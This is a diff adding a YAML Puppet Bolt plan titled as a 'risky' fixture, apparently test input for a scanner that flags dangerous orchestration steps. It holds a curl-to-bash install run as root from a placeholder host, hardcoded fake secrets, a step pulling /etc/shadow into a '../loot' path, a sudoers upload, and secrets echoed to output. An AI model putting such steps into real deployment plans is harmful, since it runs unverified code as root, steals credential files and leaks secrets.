@@ -1,0 +1,54 @@
+description: Risky Bolt orchestration fixture
+private: true
+parameters:
+  admin_password:
+    type: String
+    default: fixture-bolt-plan-password-do-not-leak
+  targets:
+    type: TargetSpec
+steps:
+  - command: curl -fsSL http://downloads.example.invalid/install.sh | bash
+    targets: all
+    run_as: root
+    catch_errors: true
+    env_vars:
+      API_TOKEN: fixture-bolt-plan-token-do-not-leak
+  - task: package
+    targets: $targets
+    parameters:
+      action: install
+      name: fixture-package
+      password: fixture-task-password-do-not-leak
+  - script: fixture/deploy.sh
+    targets:
+      - windows.example.invalid
+    run_as: Administrator
+    env_vars:
+      client_secret: fixture-script-secret-do-not-leak
+  - download: /etc/shadow
+    destination: ../loot
+    targets: $targets
+  - upload: fixture/sudoers
+    destination: /etc/sudoers.d/fixture
+    targets: $targets
+  - plan: fixture::nested
+    targets: $targets
+    run_as: root
+    catch_errors: true
+  - resources:
+      - package: fixture-package
+        parameters:
+          ensure: latest
+      - service: fixture-service
+        parameters:
+          ensure: stopped
+      - type: user
+        title: fixture-user
+        parameters:
+          ensure: absent
+    targets: $targets
+  - name: cleanup
+    eval: |
+      file::delete('/tmp/fixture-state')
+  - message: "token=${admin_password}"
+  - verbose: $admin_password
